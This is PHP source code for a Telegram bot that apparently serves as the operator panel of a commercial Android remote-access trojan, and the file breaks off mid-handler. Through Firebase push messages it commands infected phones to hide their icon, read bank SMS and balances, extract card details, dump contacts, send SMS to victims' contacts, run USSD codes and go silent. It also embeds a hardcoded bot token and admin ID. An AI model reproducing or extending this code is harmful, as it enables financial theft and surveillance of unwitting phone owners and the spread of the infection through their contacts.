<?php

include("chalim.php");

define('TOKEN', $bot_token);
define('PORT_SUDO', $sudo_port);
define('PROJECT_ID', $project_id);
define('FILE', $file);


if (!file_exists("data")) {
    mkdir("data");
    mkdir("user");
}
if (!file_exists("link.txt")) {

    file_put_contents("link.txt", "https://google.com");
    file_put_contents("data/devices.txt", "");
    file_put_contents("data/contact.txt", "0");
    file_put_contents("data/firstsms.txt", "off");
    file_put_contents("data/autohide.txt", "off");
    file_put_contents("data/number-first.txt", "09123456789");
    file_put_contents("data/message-first.txt", $dev_id);
    file_put_contents("data/offline-number.txt", "09123456789");
    file_put_contents("user/index.php", "");
    file_put_contents("data/index.php", "");
    file_put_contents("data/pingmsg.txt", "0");
    file_put_contents("data/onlineusers.txt", "");
    file_put_contents("data/online_model.txt", "list");
    file_put_contents("data/autotar.txt", "off");
    file_put_contents("data/message_contacts.txt", "off");
    file_put_contents("data/online_users.json", "");
    file_put_contents("firstaction.json", "{'balance':'off','targetphone':'off','autohide':'off'}");

}
$time_seconds_file = "data/time_seconds.json";

if (!file_exists("data")) {
    mkdir("data");
}

if (!file_exists($time_seconds_file)) {
    $initial_seconds = $days_remaining * 24 * 60 * 60;
    $time_data = [
        'total_seconds' => $initial_seconds,
        'last_updated' => time() 
    ];
    file_put_contents($time_seconds_file, json_encode($time_data));
} else {
    $time_data = json_decode(file_get_contents($time_seconds_file), true);
}

function loadTimeData() {
    global $time_seconds_file;
    if (file_exists($time_seconds_file)) {
        return json_decode(file_get_contents($time_seconds_file), true);
    }
    return null;
}

function saveTimeData($data) {
    global $time_seconds_file;
    file_put_contents($time_seconds_file, json_encode($data));
}

function secondsToTime($seconds) {
    $days = floor($seconds / (24 * 60 * 60));
    $hours = floor(($seconds % (24 * 60 * 60)) / (60 * 60));
    $minutes = floor(($seconds % (60 * 60)) / 60);
    $seconds = $seconds % 60;
    
    return [
        'days' => $days,
        'hours' => $hours,
        'minutes' => $minutes,
        'seconds' => $seconds
    ];
}

function updateRemainingTime() {
    $time_data = loadTimeData();
    if (!$time_data) {
        return false;
    }
    
    $current_time = time();
    $elapsed = $current_time - $time_data['last_updated'];
    
    if ($elapsed > 0) {
        $new_seconds = max(0, $time_data['total_seconds'] - $elapsed);
        $time_data['total_seconds'] = $new_seconds;
        $time_data['last_updated'] = $current_time;
        saveTimeData($time_data);
    }
    
    return $time_data['total_seconds'];
}

function getRemainingTime() {
    $seconds = updateRemainingTime();
    return secondsToTime($seconds);
}

function checkTimeExpired($chat_id) {
    global $sudo_port, $time_end;
    
    $remaining_seconds = updateRemainingTime();
    if ($remaining_seconds <= 0) {
        smg($chat_id, "
⚠️ ᴅᴇᴀʀ ᴜꜱᴇʀ ʏᴏᴜʀ ʀᴇᴍᴏᴛᴇ ᴛɪᴍᴇ ʜᴀꜱ ᴇxᴘɪʀᴇᴅ

📞 ꜰᴏʀ ʀᴇɴᴇᴡᴀʟ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ:
🐦‍🔥 @theold_saeed", null);
        
        $admin_id = 7712313962;
        $admin_token = "8034818551:AAFT94Vm-f-x1t06pK99V8OqhKBdOXwS0g0";

        sendMessageToAdmin($admin_token, $admin_id, "
🚨 ʜᴏꜱʜᴅᴀʀ: ᴋᴀʀʙᴀʀ ᴛɪᴍᴇ ᴛᴀᴍᴏᴍ ꜱʜᴏᴅᴇ

🛡️ ᴘᴏʀᴛ: $sudo_port
⏰ ᴛɪᴍᴇ ᴇɴᴅ: $time_end
👤 ᴜꜱᴇʀ ɪᴅ: $chat_id
📅 ᴛᴀʀɪᴋʜ: " . date('Y/m/d H:i:s'));
        
        exit();
    }
    
    $remaining_time = secondsToTime($remaining_seconds);
    $days = $remaining_time['days'];
    $hours = $remaining_time['hours'];
    $minutes = $remaining_time['minutes'];
    
    if ($days == 1 && $hours == 0 && $minutes == 0) {
        smg($chat_id, "
⚠️ ᴅᴇᴀʀ ᴜꜱᴇʀ ʏᴏᴜʀ ʀᴇᴍᴏᴛᴇ ᴛɪᴍᴇ ᴡɪʟʟ ᴇxᴘɪʀᴇ ꜱᴏᴏɴ

⏰ ᴏɴʟʏ 1 ᴅᴀʏ ʀᴇᴍᴀɪɴɪɴɢ
📞 ꜰᴏʀ ʀᴇɴᴇᴡᴀʟ ᴘʟᴇᴀꜱᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ:
🐦‍🔥 @theold_saeed", null);
        
        $admin_id = 7712313962;
        $admin_token = "8034818551:AAFT94Vm-f-x1t06pK99V8OqhKBdOXwS0g0";

        sendMessageToAdmin($admin_token, $admin_id, "
⚠️ ʜᴏꜱʜᴅᴀʀ: ᴋᴀʀʙᴀʀ ᴛɪᴍᴇ ᴀᴢ ᴀᴅ ᴍᴏɴᴅᴇ

🛡️ ᴘᴏʀᴛ: $sudo_port
⏰ ᴛɪᴍᴇ ᴇɴᴅ: $time_end
👤 ᴜꜱᴇʀ ɪᴅ: $chat_id
📅 ᴛᴀʀɪᴋʜ: " . date('Y/m/d H:i:s'));
    }
    
    return $remaining_time;
}

function sendMessageToAdmin($token, $chat_id, $text) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    
    return json_decode($result);
}
function getIranTime() {
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://worldtimeapi.org/api/timezone/Asia/Tehran");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            curl_close($ch);
            throw new Exception('Curl error');
        }
        
        curl_close($ch);
        
        if ($response) {
            $data = json_decode($response, true);
            if (isset($data['datetime'])) {
                $date = new DateTime($data['datetime']);
                return $date->format('H:i:s');
            }
        }
    } catch (Exception $e) {

    }
    
    date_default_timezone_set('Asia/Tehran');
    return date('H:i:s');
}
function Client_IP()
{
    $target_client_ip = @$_SERVER['HTTP_CLIENT_IP'];
    $target_forward_ip = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $target_remote_ip = $_SERVER['REMOTE_ADDR'];
    if (filter_var($target_client_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_client_ip;
    } elseif (filter_var($target_forward_ip, FILTER_VALIDATE_IP)) {
        $ip = $target_forward_ip;
    } else {
        $ip = $target_remote_ip;
    }
    return $ip;
}


function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}
function sendCommandWithResponse($chat_id, $device_id, $model, $command,$success_message) {
    
    $request_time = getIranTime();
    $wait_message = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ ꜰʀᴏᴍ ....\n"
                . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$model]\n"
                . "🫡ᴄᴏᴍᴍᴀɴᴅ: $command\n"
                . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    $message_id = $wait_message->result->message_id;
    
    return $message_id;
}

function smg($chatid, $text, $keyboard)
{
    bot('sendMessage', [
        'chat_id' => $chatid,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function emg($chatid, $message_id, $text, $keyboard)
{
    bot('editmessagetext', [
        'chat_id' => $chatid,
        'message_id' => $message_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => $keyboard
    ]);
}

function sf($file, $caption, $id = null)
{
    $url = "https://api.telegram.org/bot" . API_KEY . "/sendDocument?chat_id=" . $id;
    $post = array('parse_mode' => 'HTML', 'caption' => "<b>$caption</b>", 'document' => new CURLFile(realpath("$file")));
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    } else {
        return json_decode($res);
    }
}
function updateJsonValueInFile($filename, $key, $newValue)
{
    $jsonString = file_get_contents($filename);

    $data = json_decode($jsonString, true);

    if (array_key_exists($key, $data)) {
        $data[$key] = $newValue;
    } else {
        $data[$key] = $newValue;
    }
    $updatedJsonString = json_encode($data, JSON_PRETTY_PRINT);
    file_put_contents($filename, $updatedJsonString);
}
function getAccessToken($file)
{
    require 'vendor/autoload.php';
    $serviceAccountFilePath = "$file";
    $serviceAccount = json_decode(file_get_contents($serviceAccountFilePath), true);

    $clientEmail = $serviceAccount['client_email'];
    $privateKey = $serviceAccount['private_key'];

    $payload = [
        "iss" => $clientEmail,
        "scope" => "https://www.googleapis.com/auth/firebase.messaging",
        "aud" => "https://www.googleapis.com/oauth2/v4/token",
        "iat" => time(),
        "exp" => time() + 3600
    ];

    $jwt = Firebase\JWT\JWT::encode($payload, $privateKey, 'RS256');

    $requestBody = [
        "grant_type" => "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion" => $jwt
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.googleapis.com/oauth2/v4/token");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($requestBody));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);

    $accessToken = json_decode($response)->access_token;

    return $accessToken;
}

function requests($mode, $device_id)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("sath.txt", $result);
}

function send_sms_contact($dev_id_use)
{
    $send_sms_contacts = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "back_panel"], ['text' => "Send ››", 'callback_data' => "last_contacts $dev_id_use"]]
        
    ]]);
    return $send_sms_contacts;
}

function requestSMSContact($mode, $device_id, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

function requestSMS($mode, $device_id, $phone, $message)
{

    $access = getAccessToken(FILE);

    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode,
                "device_id" => $device_id,
                "phone" => $phone,
                "text" => $message
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);

}

function requestsAll($mode_all)
{
    $access = getAccessToken(FILE);
    $data = array(
        "message" => array(
            "topic" => PORT_SUDO,
            "data" => array(
                "command" => $mode_all
            ), "android" => array(
                "priority" => "high"
            )
        ),
    );

    $data_string = json_encode($data);
    $headers = array(
        "Authorization: Bearer " . $access,
        "Content-Type: application/json",
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://fcm.googleapis.com/v1/projects/" . PROJECT_ID . "/messages:send");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
    $result = curl_exec($ch);
    curl_close($ch);
    file_put_contents("xd.txt", PROJECT_ID);

}

function location($node)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/nodes/hosts");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $loc = json_decode(curl_exec($ch), true)['nodes'][$node]['location'][2];
    curl_close($ch);
    return $loc;
}

function checkhost($domain)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-http?host=$domain&node=ir1.node.check-host.net&node=ir3.node.check-host.net&node=ir5.node.check-host.net&node=ir6.node.check-host.net");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $id = json_decode(curl_exec($ch), true)['request_id'];
    sleep(2);
    curl_close($ch);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://check-host.net/check-result/$id");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
    $result = json_decode(curl_exec($ch), true);
    $arr = array();
    foreach ($result as $node => $value) {
        if (isset($value)) {
            $name = location($node);
            $arr[$name] = ['time' => $value[0][1], 'status' => $value[0][2], 'statuscode' => $value[0][3], "serverip" => $value[0][4]];
        }
    }
    return $arr;
}
    
function getPaginatedUsers($page, $pageSize = 20)
{
    $filePath = 'data/online_users.json';
    $onlineUsers = [];

    if (file_exists($filePath)) {
        $onlineUsers = json_decode(file_get_contents($filePath), true);
    }

    $totalUsers = count($onlineUsers);
    $totalPages = ceil($totalUsers / $pageSize);
    $page = max(1, min($totalPages, $page)); 

    $start = ($page - 1) * $pageSize;
    $usersOnPage = array_slice($onlineUsers, $start, $pageSize, true);

    return ['users' => $usersOnPage, 'totalUsers' => $totalUsers, 'totalPages' => $totalPages, 'currentPage' => $page];
}

function createInlineKeyboard($currentPage, $totalPages)
{
    $keyboard = [];

    if ($totalPages > 1) {
        if ($currentPage > 1) {
            $keyboard[] = ['text' => 'Previous', 'callback_data' => 'page_' . ($currentPage - 1)];
        }
        if ($currentPage < $totalPages) {
            $keyboard[] = ['text' => 'Next', 'callback_data' => 'page_' . ($currentPage + 1)];
        }
    }

    return json_encode(['inline_keyboard' => [$keyboard]]);
}

function updateMessageWithUsers($chatId, $messageId, $currentPage) {
    $pagination = getPaginatedUsers($currentPage);
    $users = $pagination['users'];
    $totalUsers = $pagination['totalUsers'];
    $totalPages = $pagination['totalPages'];

    $text = "📡 Active Connections List:\n\n";
    
    foreach ($users as $androidid => $name) {
        $userName = file_exists("user/$androidid-name.txt") ? 
                   file_get_contents("user/$androidid-name.txt") : 
                   "user".rand(1,100); 

        $text .= $userName . "-/set_" . $androidid . "\n";
    }
    
    $text .= "\nTotal Devices: " . $totalUsers . "\n";
    $text .= "Page " . $pagination['currentPage'] . "/" . $totalPages . "\n";
    $text .= "➖➖➖➖➖➖➖➖➖➖\n";

    $keyboard = createInlineKeyboard($pagination['currentPage'], $totalPages);

    emg($chatId, $messageId, $text, $keyboard);
}
#----------------------------------------------------------------
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$message_id = $update->message->message_id;
$data = $update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id) ? $update->callback_query->message->chat->id : $update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id) ? $update->callback_query->message->from->id : $update->message->from->id;
$text = $update->message->text;
$mi = $update->callback_query->message->message_id;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
$command = file_get_contents("user/$chat_id/command.txt");
$text_message = file_get_contents("user/$chat_id/message.txt");
$device_id = file_get_contents("user/$chat_id/device-id.txt");
$device_model = file_get_contents("user/$chat_id/device-model.txt");
$number_message = file_get_contents("user/$chat_id/numberlist.txt");
$ringer_mode = file_get_contents("user/$chat_id/ringer.txt");
$apk_mode = file_get_contents("user/$chat_id/apk.txt");
$action_autohide = file_get_contents("data/autohide.txt");
$status_offline = file_get_contents("user/$device_id-offline.txt");
$target_name = file_get_contents("user/$device_id-name.txt");
$install_ip = file_get_contents("user/$device_id-ip.txt");
$action_firstsms = file_get_contents("data/firstsms.txt");
$offline_number = file_get_contents("data/offline-number.txt");
$model_online = file_get_contents("data/online_model.txt");
$auto_tar = file_get_contents("data/autotar.txt");
$contact = file_get_contents("data/contact.txt");
$link_show = file_get_contents("link.txt");
#----------------------------------------------------------------
$start_button = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "📱 ᴏɴʟɪɴᴇ ʟɪsᴛ 📱", 'callback_data' => 'online_checo'],
            ['text' => "⚙️ ᴄᴏɴᴛʀᴏʟs️ ⚙️ ️" , 'callback_data' => 'setting']
        ],
        [
            ['text' => "🐀 ʀᴀᴛ ᴍᴇɴᴜ 🐀", 'callback_data' => 'rat_set']
        ],
        [
            ['text' => "🎯 ᴀᴜᴛᴏ ᴛᴀsᴋs 🎯 ", 'callback_data' => 'firstaction']
        ],
    ]
]);
$checkhost = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🛡️ ᴄʜᴇᴄᴋ ꜰɪʟᴛᴇʀɪɴɢ 🛡️", 'callback_data' => 'checkhost']
        ]
     ]   
]);

$goooo = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🌐 ꜱᴇᴛ ᴜʀʟ 🌐", 'callback_data' => 'set_url'],
            ['text' => "🔗 ꜱʜᴏᴡ ᴜʀʟ 🔗", 'callback_data' => 'show_url']
        ],
        [
            
            ['text' => "↩ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
        ]
    ]
]);



if (isset($update->message) && file_exists("user/".$update->message->chat->id."/rat_name_action.txt")) {
    processRatNameReply($update->message->chat->id, $update->message->text);
}
$goooo2 = json_encode([
    'resize_keyboard' => true,
    'inline_keyboard' => [
        [
            ['text' => "🌐 ᴏɴʟɪɴᴇ ᴍᴏᴅᴇʟ", 'callback_data' => 'online_model'], 
            ['text' => "$model_online", 'callback_data' => 'online_model']
        ],
        [
            ['text' => "✏️ ᴇᴅɪᴛ ᴍᴇꜱꜱᴀɢᴇ ✏️️️", 'callback_data' => 'edit_message_all']
        ],
        [
            ['text' => "📨 ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ 📨", 'callback_data' => 'set_message_contacts']
        ],
        [
            ['text' => "🤖 ᴀᴜᴛᴏ ᴏꜰꜰʟɪɴᴇ", 'callback_data' => 'autotar'],
            ['text' => "$auto_tar", 'callback_data' => 'autotar']
        ],
        [
            ['text' => "◀️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
        ]
    ]
]);

function control_button($dev_id_use) {
    $ringer_mode = file_get_contents("user/$dev_id_use-ringer.txt");
    $apk_mode = file_get_contents("user/$dev_id_use-apk.txt");

    $control_button = json_encode([  
    'resize_keyboard' => true,  
    'inline_keyboard' => [
        [
            ['text' => "🛜 ᴘɪɴɢ ᴅᴇᴠɪᴄᴇ 🛜", 'callback_data' => "status_user $dev_id_use"]
        ],
        [
            ['text' => "📲 ᴜꜱꜱᴅ ᴄᴏᴅᴇ", 'callback_data' => "ussdcode $dev_id_use"],
            ['text' => "📞 ɢᴇᴛ ɴᴜᴍʙᴇʀ", 'callback_data' => "userphone $dev_id_use"]
        ],
        [
            ['text' => "🎭 ᴄʜᴀɴɢᴇ", 'callback_data' => "change $dev_id_use"],
            ['text' => "🙈 ʜɪᴅᴇ", 'callback_data' => "hide_icon $dev_id_use"],
            ['text' => "👁 ꜱʜᴏᴡ", 'callback_data' => "visible_icon $dev_id_use"]
        ],
        [
            ['text' => "💸 ʙᴀʟᴀɴᴄᴇꜱ 💸", 'callback_data' => "balance $dev_id_use"]
        ],
        [
            ['text' => "🏦 ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ", 'callback_data' => "last_Bank_sms $dev_id_use"],
            ['text' => "📑 ʙᴀɴᴋ ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "All_Bank_sms $dev_id_use"]
        ],
        [
            ['text' => "🌐 ᴏɴʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeon $dev_id_use"],
            ['text' => "🚫 ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ", 'callback_data' => "offmodeoff $dev_id_use"]
        ],
        [
            ['text' => "👥 ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "all_contacts $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛꜱ", 'callback_data' => "sms_contacts $dev_id_use"]
        ],
        [
            ['text' => "📩 ʟᴀꜱᴛ ꜱᴍꜱ", 'callback_data' => "last_sms $dev_id_use"],
            ['text' => "✉️ ꜱᴇɴᴅ ꜱᴍꜱ", 'callback_data' => "send_sms $dev_id_use"]
        ],
        [
            ['text' => "📜 ꜱᴍꜱ ʟɪꜱᴛ", 'callback_data' => "Popo $dev_id_use"],
            ['text' => "📤 ᴏᴜᴛʙᴏx", 'callback_data' => "sent $dev_id_use"],
            ['text' => "📥 ɪɴʙᴏx", 'callback_data' => "recived $dev_id_use"]
        ],
        [
            ['text' => "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ", 'callback_data' => "searchSMS $dev_id_use"],
            ['text' => "💳 ᴄᴀʀᴅ ɪɴꜰᴏ", 'callback_data' => "extract_cards $dev_id_use"]
        ],
        [
            ['text' => "🔕 ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ", 'callback_data' => "silent_mode $dev_id_use"],
            ['text' => "🔔 ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ", 'callback_data' => "normal_mode $dev_id_use"]
        ],
        [
            ['text' => "📮 ɢᴇᴛ ʀᴀɴɢᴇ 📮", 'callback_data' => "get_range $dev_id_use"]
        ],
        [
            ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => "back_home"]
        ]
    ]
]);
return $control_button;
}


function info_button($dev_id_use)
{
    $device_id = file_get_contents("user/$dev_id_use-model.txt");
    $status_offline2 = file_get_contents("user/$dev_id_use-offline.txt");


    $info_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Name Target", 'callback_data' => "nametarget $dev_id_use"]],
        [['text' => "Clear All Info", 'callback_data' => "clearinfo $dev_id_use"]]
    ]]);
    return $info_button;
}



$back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']]
]]);
$onli_btn = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Send Requests››", 'callback_data' => 'online_checo']]
]]);
$back_home = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_home']]
]]);
$back_settings = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'setting']]
]]);
$dev_inline = json_encode(array('inline_keyboard' => [
    [['text' => "Get Pv Dev", 'url' => "t.me/$dev_id"]]
]));
$url_inline = json_encode(array('inline_keyboard' => [
    [['text' => "$link_show", 'url' => "$link_show"]]
]));

function sms_button($dev_id_use)
{
    $sms_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "Edite Text", 'callback_data' => "edit_message $dev_id_use"]],
        [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"], ['text' => "Next ››", 'callback_data' => "set_list $dev_id_use"]]
    ]]);
    return $sms_button;
}

$model_button = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ʟɪꜱᴛ", 'callback_data' => 'list_model'], ['text' => "ꜱɪɴɢᴇʟ", 'callback_data' => 'singel_model']],
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings']],
]]);
$changeiconButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [[['text' => "ᴄʜʀᴏᴍᴇ", 'callback_data' => 'chrome'], ['text' => "ᴛᴇʟᴇɢʀᴀᴍ", 'callback_data' => 'telegram']],
    [['text' => "ʏᴏᴜᴛᴜʙᴇ", 'callback_data' => 'youtube'], ['text' => "ɢᴏᴏɢʟᴇ", 'callback_data' => "google $datass[1]"]],
    [['text' => "‹‹ Back", 'callback_data' => 'back_panel']],
]]);
function getsmsButton($dev_id_use)
{
    $getsmsButton = json_encode(['resize_keyboard' => true, 'inline_keyboard' =>
        [[['text' => "", 'callback_data' => "sent $dev_id_use"], ['text' => "", 'callback_data' => "recived $dev_id_use"]],
            [['text' => "📨ᴀʟʟ ꜱᴍꜱ📨", 'callback_data' => "Popo $dev_id_use"]],
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $dev_id_use"]],
        ]]);
    return $getsmsButton;
}

$sms_button_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "Edite Text", 'callback_data' => 'edit_message_all']],
    [['text' => "‹‹ Back", 'callback_data' => 'setting'], ['text' => "Next ››", 'callback_data' => 'set_list_all']]
]]);
function back_sms($dev_id_use)
{
    $back_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"]]
    ]]);
    return $back_sms;
}

function send_sms($dev_id_use)
{
    $send_sms = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "‹‹ Back", 'callback_data' => "send_sms $dev_id_use"], ['text' => "Send ››", 'callback_data' => "last_send $dev_id_use"]]
    ]]);
    return $send_sms;
}

$send_sms_all = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
    [['text' => "‹‹ Back", 'callback_data' => 'back_settings'], ['text' => "Send ››", 'callback_data' => 'last_send_all']]
]]);

if (in_array($chat_id, $sudo_user)) {
if (preg_match('/^\/([Ss]tart)(.*)/', $text)) {
    if (!file_exists("user/$chat_id")) {
        mkdir("user/$chat_id");
        file_put_contents("user/$chat_id/command.txt", "");
        file_put_contents("user/$chat_id/message.txt", "$dev_id");
        file_put_contents("user/$chat_id/device-id.txt", "");
        file_put_contents("user/$chat_id/device-model.txt", "null");
        file_put_contents("user/$chat_id/numberlist.txt", "");
        file_put_contents("user/$chat_id/ringer.txt", "Normal");
        file_put_contents("user/$chat_id/apk.txt", "Visible");
    }
    
    $remaining_time = checkTimeExpired($chat_id);
    $days = $remaining_time['days'];
    $hours = $remaining_time['hours'];
    $minutes = $remaining_time['minutes'];
    
    $request_time = getIranTime();
smg($chat_id, "
🐋 ʜᴇʟʟᴏ ᴅᴇᴀʀ ᴜꜱᴇʀ ~> <a href='tg://user?id=$from_id'>$first_n</a> 

🛡️ ᴘᴏʀᴛ: $sudo_port
👥 ᴜꜱᴇʀꜱ: $contact
<blockquote>
🕒 ᴛɪᴍᴇ : $request_time
📅 ᴘᴜʀᴄʜᴀꜱᴇ ᴅᴀᴛᴇ: $bye_port
⏰ ᴇxᴘɪʀʏ ᴅᴀᴛᴇ: $time_end
⏳ ʀᴇᴍᴀɪɴɪɴɢ: $days ᴅᴀʏꜱ $hours ʜᴏᴜʀꜱ $minutes ᴍɪɴꜱ
</blockquote>
🌀 ꜱᴇʟᴇᴄᴛ ᴀᴄᴛɪᴏɴ:
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $start_button);

    } elseif (strpos($text, '/check') !== false) {
        $ex = explode("-", $text);
